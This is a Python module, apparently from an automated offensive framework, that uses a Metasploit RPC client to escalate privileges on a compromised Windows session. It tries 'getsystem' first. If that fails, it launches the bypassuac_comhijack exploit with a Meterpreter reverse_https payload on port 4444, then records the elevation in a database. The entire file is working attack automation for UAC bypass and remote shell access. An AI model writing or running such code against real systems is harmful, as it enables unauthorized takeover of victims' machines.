#!/usr/bin/env python3
from data.escalation import EscalationData
from data.session import Session
from data.event import EventUtils

class Escalation:
    def getElevated(self, msfclient, sessionInput):
        try:
            EventUtils.settingEvent(self, "Trying to get elevated on session"+sessionInput+".")
            session = Session.objects(_id=sessionInput).first()
            if session:
                esc = EscalationData.objects(_id=sessionInput).first()
                if esc:
                    EventUtils.settingEvent(self, "["+sessionInput+"] You currently own the system.")
                    print("[!]You own the system.")
                else:
                    EventUtils.settingEvent(self, "["+sessionInput+"] Attempting to elevate via getsystem...")
                    esc = EscalationData()
                    getsystem = msfclient.client.sessions.session(sessionInput).run_with_output('getsystem').splitlines()
                    if '[-]' in getsystem[0]:
                        EventUtils.settingEvent(self, "["+sessionInput+"] Attempting bypassuac_comijack...")
                        print("[!]Failed getsystem. Trying bypassuac_comijack...")
                        exploit = msfclient.client.modules.use('exploit', 'exploit/windows/local/bypassuac_comhijack')
                        exploit['SESSION'] = int(sessionInput)
                        payload = msfclient.client.modules.use('payload', 'windows/x64/meterpreter/reverse_https')
                        payload['LHOST'] = "0.0.0.0"
                        payload['LPORT'] = 4444
                        exploit.execute(payload=payload)
                        esc.getsystem = True
                        session.esc_id.append(esc._id)
                    else:
                        EventUtils.settingEvent(self, "["+sessionInput+"] You currently own the system.")
                        print("[+]Gained system. Start gaining info")
                        session.esc_id.append(esc._id)
                        esc.getsystem = True
                    esc.save()
                    session.save()
        except Exception as msg:
            print(msg)
            pass
